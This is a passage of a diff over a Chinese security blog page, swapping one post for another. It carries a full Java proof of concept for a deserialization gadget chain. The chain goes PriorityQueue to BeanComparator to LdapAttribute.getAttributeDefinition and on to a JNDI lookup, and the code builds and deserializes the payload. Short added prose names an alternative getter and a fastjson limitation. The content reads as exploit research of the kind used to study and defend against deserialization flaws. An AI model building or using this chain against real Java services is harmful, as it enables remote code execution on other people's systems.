javax.naming.directory.DirContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.InitialDirContext;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">//anyToGetter -&gt; LdapAttribute.getAttributeDefinition() -&gt;</span></span><br><span class="line"><span class="comment">//    PartialCompositeDirContext.getSchema() -&gt;</span></span><br><span class="line"><span class="comment">//    ComponentContext.p_getSchema() -&gt; p_resolveIntermediate() -&gt; c_resolveIntermediate_nns()</span></span><br><span class="line"><span class="comment">//    LdapCtx.c_lookup() -&gt;</span></span><br><span class="line"><span class="comment">//    DirectoryManager.getObjectInstance JNDI</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapAttribute_getterToJNDI</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">CompositeName</span> <span class="variable">compositeName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CompositeName</span>(<span class="string">&quot;a/#JNDI_RuntimeEvil&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; ldapAttributeClass = Class.forName(<span class="string">&quot;com.sun.jndi.ldap.LdapAttribute&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; ldapAttributeClassConstructor = ldapAttributeClass.getDeclaredConstructor(String.class, DirContext.class, Name.class);</span><br><span class="line">        ldapAttributeClassConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        <span class="type">LdapCtx</span> <span class="variable">ldapContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LdapCtx</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>, env, <span class="literal">false</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ldapAttributeInstance</span> <span class="operator">=</span> ldapAttributeClassConstructor.newInstance(<span class="string">&quot;godown&quot;</span>, ldapContext, compositeName);</span><br><span class="line"><span class="comment">//        Field baseCtxURL = ldapAttributeInstance.getClass().getDeclaredField(&quot;baseCtxURL&quot;);</span></span><br><span class="line"><span class="comment">//        baseCtxURL.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        baseCtxURL.set(ldapAttributeInstance,&quot;ldap://127.0.0.1:1099/&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;attributeDefinition&quot;</span>);</span><br><span class="line">        PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">1</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>)));</span><br><span class="line">        priorityQueue.add(ldapAttributeInstance);</span><br><span class="line">        priorityQueue.add(ldapAttributeInstance);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">compareField</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        compareField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        compareField.set(priorityQueue,beanComparator);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        java.io.<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileInputStream(Filename);</span><br><span class="line">        java.io.<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectInputStream(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-
-
-<p>漏洞应该是作者翻看URL这个与外界通信的类时发现的。有超多地方都调用的hashCode，仔细一看hashCode进一步进行了DNS解析。进一步寻找readObject触发到hashCode的链子。而不是作者从InetAddress开始找的，只是本文按顺序如此分析。</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250610165623831.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250610165623831.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250610165623831"></p>
+<p>在查找用法中不仅LdapAttribute.getAttributeDefinition可用，getAttributeSyntaxDefinition也可用</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250605105604138.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250605105604138.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250605105604138"></p>
+<p>所以改成<code>BeanComparator beanComparator = new BeanComparator(&quot;attributeSyntaxDefinition&quot;);</code>也能成功触发</p>
+<p>不过因为需要反射调用LdapAttribute构造函数的原因，不能在fastjson这种里面去使用，还是有一些局限性</p>
 
       </div>
       <div class="post-tags-categories">
         
         <div class="tags">
           
-            <a href="/tags/CC/" class="">
-              CC
+            <a href="/tags/JNDI/" class="">
+              JNDI
             </a>
           
         </div>
@@ -700,7 +713,7 @@
     </li>
     <li class="post-copyright-link">
     <strong>文章链接:  </strong>
-    <a href="/2024/07/19/urldns-bu-ke/" target="_blank" title="CC重启之URLDNS补课">https://godownio.github.io/2024/07/19/urldns-bu-ke/</a>
+    <a href="/2025/06/10/ldapattribute-jndi/" target="_blank" title="LdapAttribute getter JNDI">https://godownio.github.io/2025/06/10/ldapattribute-jndi/</a>
     </li>
     <li class="post-copyright-license">
       <strong>版权声明:   </strong>
@@ -718,42 +731,21 @@
 
 
 
-  
-  <div class="post-nav-prev post-nav-item">
-    <div class="post-nav-img" style="background-size: cover; 
-      background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B889.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B889.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-    </div>
-    <a href="/2024/07/20/lei-urldns-de-cc6/" class="post-nav-link">
-      <div class="title">
-        <i class="fas fa-angle-left"></i> 上一篇:
-        <div class="title-text">CC重启之类URLDNS的CC6</div>
-      </div>
-      
-      <!-- <div class="content">
-        CC6在上一篇文章的分析中
-https://godownio.github.io/2024/07/13/cc-chong
-      </div> -->
-    </a>
-  </div>
-
 
 
   
   <div class="post-nav-next post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B887.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B887.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8160.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8160.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
     </div>
-    <a href="/2024/07/13/cc-chong-qi-zhi-ji-yu-dong-tai-dai-li-gou-zao-de-lazymap-ban-cc1/" class="post-nav-link">
+    <a href="/2025/06/04/spring-aop-lian/" class="post-nav-link">
       <div class="title">
         下一篇: <i class="fas fa-angle-right"></i>
-        <div class="title-text">CC重启之基于动态代理构造的LazyMap CC1及利用二次反序列化的修复</div>
+        <div class="title-text">Spring AOP链</div>
       </div>
       <!-- <div class="content">
-        本文首发于https://www.freebuf.com/vuls/406123.html
-前置知识：
-Java动态代理
+        Spring AOP链springAOP简介Spring AOP（Aspect-Oriented Programming
       </div> -->
     </a>
   </div>
@@ -974,7 +966,7 @@ Java动态代理
   <div class='content'>
     <div class="toc-main">
       <div class="toc-content">
-        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#URLDNS"><span class="toc-text">URLDNS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E8%A7%A3%E6%9E%90"><span class="toc-text">DNS解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%BE%E6%8E%A5%E5%88%B0readObject"><span class="toc-text">链接到readObject</span></a></li></ol></li></ol> -->
+        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI-Reference%E9%82%A3%E4%BA%9B%E4%BA%8B"><span class="toc-text">JNDI Reference那些事</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E5%9E%8B1%EF%BC%9ARMI-Reference%E5%B0%81%E8%A3%85"><span class="toc-text">类型1：RMI Reference封装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E5%9E%8B2%EF%BC%9ALDAP-%E9%9D%9EReference%E5%B0%81%E8%A3%85"><span class="toc-text">类型2：LDAP 非Reference封装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E8%80%85%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">二者的区别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LdapAttribute-JNDI"><span class="toc-text">LdapAttribute JNDI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc%E6%9E%84%E9%80%A0"><span class="toc-text">poc构造</span></a></li></ol></li></ol> -->
         <div class="toc"></div>
       </div>
     </div>
